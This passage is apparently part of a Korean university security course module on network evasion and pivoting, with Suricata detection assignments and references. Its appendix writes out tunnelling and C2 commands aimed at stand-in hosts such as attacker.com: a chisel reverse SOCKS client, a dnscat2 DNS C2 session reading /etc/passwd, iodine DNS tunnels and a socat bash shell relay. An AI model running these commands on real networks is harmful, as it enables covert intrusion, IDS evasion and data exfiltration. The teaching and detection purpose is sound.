+| 2 | 프래그먼트 스캔 | nmap -f | 정상 결과 반환 |
+| 3 | Idle 스캔 원리 | 구두 설명 | IP ID 기반 매커니즘 설명 |
+| 4 | 소스 포트 조작 | nmap -g 53 | 추가 포트 발견 가능 |
+| 5 | Suricata 규칙 분석 | 규칙 파일 확인 | content 매칭 로직 이해 |
+| 6 | 인코딩 우회 | curl + URL encoding | IDS 미탐지 |
+| 7 | 저속 스캔 | --scan-delay | IDS 임계값 미달 |
+| 8 | SSH 로컬 포워딩 | ssh -L | 터널 통한 접근 성공 |
+| 9 | SOCKS 프록시 | ssh -D | 프록시 통한 접근 성공 |
+| 10 | 종합 시나리오 | 전체 실행 | 5단계 완료 |
+
+---
+
+## 과제
+
+### 과제 1: 우회 기법 효과 분석 (개인)
+실습에서 사용한 6가지 우회 기법(Decoy, 프래그먼트, 소스포트, 인코딩, 타이밍, 터널링)의 효과를 표로 정리하라. 각 기법의 우회 대상(방화벽/IDS/WAF), 성공률, 탐지 여부를 포함할 것.
+
+### 과제 2: Suricata 커스텀 규칙 작성 (팀)
+이번 주 실습에서 사용한 우회 기법을 탐지할 수 있는 Suricata 커스텀 규칙 5개를 작성하라. 각 규칙의 탐지 로직, content/pcre 등 매칭 조건, 임계값 설정을 포함할 것.
+
+### 과제 3: 네트워크 보안 아키텍처 개선안 (팀)
+현재 실습 환경의 보안 아키텍처(nftables + Suricata + BunkerWeb)의 약점을 분석하고, 우회 기법에 대응할 수 있는 개선안을 제시하라. 추가 장비 도입, 규칙 강화, 모니터링 개선 등을 포함할 것.
+
+---
+
+## 📂 실습 참조 파일 가이드
+
+> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+
+### Nmap
+> **역할:** 포트 스캔·서비스 탐지·NSE 스크립트  
+> **실행 위치:** `bastion / 공격자 측`  
+> **접속/호출:** `nmap` CLI
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `/usr/share/nmap/scripts/` | NSE 스크립트 모음 (vuln, default 등) |
+| `/usr/share/nmap/nmap-services` | 포트↔서비스 매핑 |
+
+**핵심 설정·키**
+
+- `-sS -sV -O` — SYN 스캔 + 버전 + OS
+- `--script vuln` — 취약점 스크립트 카테고리
+- `-T0..T5` — 스캔 타이밍 — T3 기본, T4 실습용
+
+**로그·확인 명령**
+
+- `-oA scan` — 3가지 포맷(`.nmap/.gnmap/.xml`) 동시 저장
+
+**UI / CLI 요점**
+
+- `nmap -sV -p- 10.20.30.80` — 전 포트 + 버전
+- `nmap --script=http-enum 10.20.30.80` — 웹 디렉토리 열거
+- `nmap -sn 10.20.30.0/24` — 호스트 발견(핑 스윕)
+
+> **해석 팁.** IPS가 있는 환경에서 T4 이상은 빠르게 탐지된다. `-T2`로 느리게 + `--max-retries 1`로 재전송 최소화하면 우회 확률↑.
+
+### Suricata IDS/IPS
+> **역할:** 시그니처 기반 네트워크 침입 탐지/차단 엔진  
+> **실행 위치:** `secu (10.20.30.1)`  
+> **접속/호출:** `systemctl status suricata` / `suricatasc` 소켓 / `suricata -T`
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `/etc/suricata/suricata.yaml` | 메인 설정 (HOME_NET, af-packet, rule-files) |
+| `/etc/suricata/rules/local.rules` | 사용자 커스텀 탐지 룰 |
+| `/var/lib/suricata/rules/suricata.rules` | `suricata-update` 병합 룰 |
+| `/var/log/suricata/eve.json` | JSON 이벤트 (alert/flow/http/dns/tls) |
+| `/var/log/suricata/fast.log` | 알림 1줄 텍스트 로그 |
+| `/var/log/suricata/stats.log` | 엔진 성능 통계 |
+
+**핵심 설정·키**
+
+- `HOME_NET` — 내부 대역 — 틀리면 내부/외부 판별 실패
+- `af-packet.interface` — 캡처 NIC — 트래픽이 흐르는 인터페이스와 일치해야 함
+- `rule-files: ["local.rules"]` — 로드할 룰 파일 목록
+
+**로그·확인 명령**
+
+- `jq 'select(.event_type=="alert")' eve.json` — 알림만 추출
+- `grep 'Priority: 1' fast.log` — 고위험 탐지만 빠르게 확인
+
+**UI / CLI 요점**
+
+- `suricata -T -c /etc/suricata/suricata.yaml` — 설정/룰 문법 검증
+- `suricatasc -c stats` — 실시간 통계 조회 (런타임 소켓)
+- `suricata-update` — 공개 룰셋 다운로드·병합
+
+> **해석 팁.** `stats.log`의 `kernel_drops > 0`이면 누락 발생 → `af-packet threads` 증설. 커스텀 룰 `sid`는 **1,000,000 이상** 할당 권장.
+
+---
+
+## 실제 사례 (WitFoo Precinct 6 — Network Pivoting)
+
+> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
+> 본 lecture *Network Pivoting* 학습 항목 매칭.
+
+### Network Pivoting 의 dataset 흔적 — "내부 네트워크 hop"
+
+dataset 의 정상 운영에서 *내부 네트워크 hop* 신호의 baseline 을 알아두면, *Network Pivoting* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — 5156 lateral 패턴.
+
+```mermaid
+graph LR
+    SCENE["Network Pivoting 시나리오"]
+    TRACE["dataset 흔적<br/>내부 네트워크 hop"]
+    DETECT["탐지 / 분석"]
+
+    SCENE --> TRACE
+    TRACE --> DETECT
+
+    style SCENE fill:#ffe6cc
+    style DETECT fill:#cce6ff
+```
+
+### Case 1: dataset 정량 지표
+
+| 항목 | 값 |
+|---|---|
+| 핵심 신호 | 내부 네트워크 hop |
+| 정량 baseline | 5156 lateral 패턴 |
+| 학습 매핑 | ProxyChains + SOCKS |
+
+**자세한 해석**: ProxyChains + SOCKS. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.
+
+### Case 2: 실전 적용 시나리오
+
+| 단계 | dataset 활용 |
+|---|---|
+| 시도 식별 | 내부 네트워크 hop 의 spike |
+| 정상 vs 이상 | baseline 대비 비율 |
+| 룰 작성 | Suricata / Wazuh / Sigma |
+| 검증 | dataset 재실행 |
+
+**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.
+
+### 이 사례에서 학생이 배워야 할 3가지
+
+1. **Network Pivoting = 내부 네트워크 hop 의 anomaly** — 정량 신호로 탐지.
+2. **baseline 숫자 외우기** — 5156 lateral 패턴.
+3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.
+
+**학생 액션**: lab 3-hop pivot.
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 03 네트워크 우회)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 | 명령 |
+|------|----------|---------|------|
+| s1 | SSH local forward | OpenSSH `-L` | `ssh -L 1234:internal:80 user@jump` |
+| s2 | SSH dynamic SOCKS | OpenSSH `-D` | `ssh -D 1080 user@jump` |
+| s3 | SSH ProxyJump | OpenSSH `-J` | `ssh -J jump1,jump2 internal-host` |
+| s4 | sshuttle (VPN-like) | sshuttle | `sshuttle -r user@jump 10.0.0.0/24` |
+| s5 | chisel HTTP tunnel | chisel | `chisel server -p 8000 --reverse` |
+| s6 | proxychains | proxychains4 | `proxychains4 nmap -sT 10.0.0.5` |
+| s7 | dnscat2 (DNS C2) | dnscat2 | `ruby dnscat2.rb attacker.com` |
+| s8 | iodine (DNS tunnel) | iodine | `sudo iodine -P pwd t.attacker.com` |
+
+### 학생 환경 준비
+
+```bash
+# === SSH (이미 설치) ===
+ssh -V
+
+# === sshuttle (가장 단순한 VPN-like) ===
+sudo apt install -y sshuttle
+
+# === chisel (Go, HTTP tunnel) ===
+go install github.com/jpillora/chisel@latest
+# 또는:
+curl -sSL https://i.jpillora.com/chisel | bash
+
+# === proxychains4 ===
+sudo apt install -y proxychains4
+
+# === dnscat2 ===
+git clone https://github.com/iagox86/dnscat2 ~/dnscat2
+# Server (Ruby): cd ~/dnscat2/server && bundle install
+sudo apt install -y ruby-bundler
+cd ~/dnscat2/server && bundle install
+
+# Client (C): cd ~/dnscat2/client && make
+cd ~/dnscat2/client && make
+
+# === iodine ===
+sudo apt install -y iodine
+
+# === stunnel (TLS wrapper) ===
+sudo apt install -y stunnel4
+
+# === socat (다목적 relay) ===
+sudo apt install -y socat
+```
+
+### SSH 우회 패턴 (5 종)
+
+```bash
+# === 1. Local Forward (-L) ===
+# attacker → jump.example.com 통해 internal:80 접근
+ssh -L 8080:internal-host:80 user@jump.example.com
+
+# 이제 attacker 의 localhost:8080 → internal-host:80
+curl http://localhost:8080
+
+# === 2. Dynamic SOCKS (-D) — 가장 유연 ===
+ssh -D 1080 user@jump.example.com
+
+# 이제 SOCKS5 proxy 1080 → jump.example.com
+proxychains4 nmap -sT 10.0.0.0/24                       # 내부망 스캔
+firefox --proxy-server="socks://localhost:1080"          # 브라우저 통해
+
+# === 3. Remote Forward (-R) — reverse tunnel ===
+# 침투한 host 에서 attacker 로 callback
+ssh -R 9090:localhost:22 attacker@external.com
+# attacker 의 localhost:9090 → 침투한 host 의 22
+ssh -p 9090 user@localhost                              # attacker 가 침투한 host 의 22 로 SSH
+
+# === 4. ProxyJump (-J) — 다중 hop ===
+ssh -J jump1,jump2,jump3 user@deep-internal-host
+
+# === 5. ProxyCommand (advanced) ===
+ssh -o "ProxyCommand=ssh user@jump nc %h %p" user@internal-host
+```
+
+### sshuttle (가장 단순한 transparent proxy)
+
+```bash
+# === 1. 단순 사용 (root 권한 — iptables 자동 변경) ===
+sudo sshuttle -r user@jump.example.com 10.0.0.0/24
+
+# 이제 모든 10.0.0.x 트래픽이 자동으로 jump 통해 라우팅
+# 원래처럼 사용:
+nmap -sT 10.0.0.5                                       # 자동 tunnel
+curl http://10.0.0.10/                                  # 자동 tunnel
+
+# === 2. DNS 도 tunnel ===
+sudo sshuttle -r user@jump --dns 10.0.0.0/24
+
+# === 3. 다중 subnet ===
+sudo sshuttle -r user@jump 10.0.0.0/8 192.168.0.0/16
+
+# === 4. 종료 ===
+# Ctrl-C → iptables 자동 복원
+```
+
+### chisel (HTTP tunnel — 외부 firewall 우회)
+
+```bash
+# === Scenario: 침투한 내부 host 의 SOCKS 통해 attacker 가 내부망 접근 ===
+
+# 1) Attacker (외부, 80/443 만 허용 환경) — Server 시작
+chisel server -p 443 --reverse \
+    --auth user:pass
+
+# 2) 침투한 내부 host — Client (reverse tunnel)
+chisel client http://attacker.com:443 \
+    --auth user:pass \
+    R:1080:socks
+
+# 3) Attacker 측 — SOCKS proxy 사용
+proxychains4 nmap -sT 10.0.0.0/24                       # attacker 의 1080 → 침투 host 의 모든 네트워크
+
+# === HTTP 만 허용된 환경에서 효과적 ===
+# - SSH 차단 + HTTP 허용 → chisel HTTP/S 가 통과
+# - WebSocket fallback 자동
+```
+
+### proxychains4 (다중 SOCKS 체인)
+
+```bash
+# /etc/proxychains4.conf
+sudo tee /etc/proxychains4.conf << 'PEOF'
+strict_chain                                           # 모든 proxy 통과 강제
+proxy_dns
+remote_dns_subnet 224
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 127.0.0.1 1080                                 # SSH dynamic
+socks5 internal-jump.local 1080                       # 두 번째 hop
+PEOF
+
+# 사용
+proxychains4 nmap -sT -Pn 10.0.0.5                    # 모든 traffic SOCKS chain 통과
+proxychains4 ssh user@deep-internal                    # 다중 hop
+proxychains4 sqlmap -u "http://internal/?q=test"
+```
+
+### dnscat2 (DNS C2 — 가장 은닉)
+
+```bash
+# === Scenario: DNS 만 외부 허용된 환경에서 C2 ===
+
+# 1) 도메인 NS 설정 (실제로는 attacker 가 등록한 도메인)
+# attacker.com 의 NS 가 attacker server 를 가리키게 설정
+
+# 2) Server (attacker)
+ruby ~/dnscat2/server/dnscat2.rb attacker.com \
+    --secret=mysecret
+
+# 출력:
+# New session established: 12345
+# 모든 DNS query 가 attacker 에 도달
+
+# 3) Client (target)
+~/dnscat2/client/dnscat \
+    --secret=mysecret \
+    --dns server=8.8.8.8,domain=attacker.com
+
+# 4) Attacker 측 (interactive shell)
+dnscat2> sessions
+dnscat2> session -i 1
+session 1> shell
+new windows... (#1)
+session 1> window -i 1
+shell #1> ls
+shell #1> cat /etc/passwd
+```
+
+### iodine (DNS tunnel — 풀 IP traffic)
+
+```bash
+# === Scenario: 외부 인터넷 모두 차단, DNS 만 허용 ===
+
+# 1) 도메인 NS 설정
+# t.attacker.com 의 NS → attacker IP
+
+# 2) Server (attacker)
+sudo iodined -f -c -P pwd 10.0.0.1 t.attacker.com &
+
+# 3) Client (target)
+sudo iodine -f -P pwd t.attacker.com
+
+# 4) Tunnel 인터페이스 자동 생성
+ip addr show dns0
+# inet 10.0.0.2/27 → 새 IP 할당
+
+# 5) 모든 IP traffic 가 DNS 으로
+# Attacker 의 SSH server 접근 (DNS 으로 wrapping):
+ssh -i key 10.0.0.1                                    # iodine 통해
+
+# 또는 모든 traffic route:
+ip route add default via 10.0.0.1 dev dns0
+```
+
+### stunnel + socat (TLS wrapping)
+
+```bash
+# === stunnel (TCP service 를 TLS 으로 감쌈) ===
+# Server side
+sudo tee /etc/stunnel/stunnel.conf << 'EOF2'
+[http]
+accept = 0.0.0.0:8443
+connect = 127.0.0.1:80
+cert = /etc/stunnel/cert.pem
+EOF2
+
+sudo systemctl restart stunnel4
+
+# Client (any TLS client 으로 8443 접근 → 자동 80 으로 forward)
+
+# === socat (다목적 relay) ===
+# TCP → SSH tunnel
+socat TCP4-LISTEN:9999,fork \
+    OPENSSL-CONNECT:internal:443,verify=0
+
+# Pipe (process 간)
+socat - EXEC:/bin/bash,pty,setsid,stderr
+```
+
+### 우회 도구 비교
+
+| 도구 | 강점 | 약점 | 사용처 |
+|------|------|------|--------|
+| **SSH -D** | 가장 단순, 표준 | SSH 차단 시 무용 | SSH 허용 환경 |
+| **sshuttle** | Transparent (앱 변경 X) | root 필요 | 빠른 임시 access |
+| **chisel** | HTTP tunnel (80/443 만 허용 시) | 추가 binary | 엄격한 firewall |
+| **proxychains4** | 다중 SOCKS chain | 모든 앱 호환 | 분산 IP 사용 |
+| **dnscat2** | DNS 만 허용 시 | 매우 느림, 도메인 필요 | 극단적 격리 |
+| **iodine** | 풀 IP traffic over DNS | 도메인 + NS 필요 | DNS-only 환경 |
+| **stunnel** | TLS wrapping | 양쪽 cert 관리 | TLS 강제 환경 |
+
+### 통합 시나리오 — 다중 hop 침투
+
+```
+[Attacker (external)]
+    ↓ chisel HTTP/443 (외부망 → 내부 침투 host)
+[침투 host #1 (DMZ)]
+    ↓ ssh -D 1080 (DMZ → 내부)
+[Internal jump]
+    ↓ proxychains4 → ssh -J → ...
+[Deep internal target (예: DC)]
+    ↑ exfil
+    ↑ iodine DNS tunnel
+[Attacker (외부)]
+```
+
+학생은 본 3주차에서 **OpenSSH (-L/-D/-J/-R) + sshuttle + chisel + proxychains4 + dnscat2 + iodine + stunnel + socat** 8 도구로 advanced 네트워크 우회 (SSH / SOCKS / HTTP tunnel / DNS tunnel) 의 OSS 표준 흐름을 익힌다.
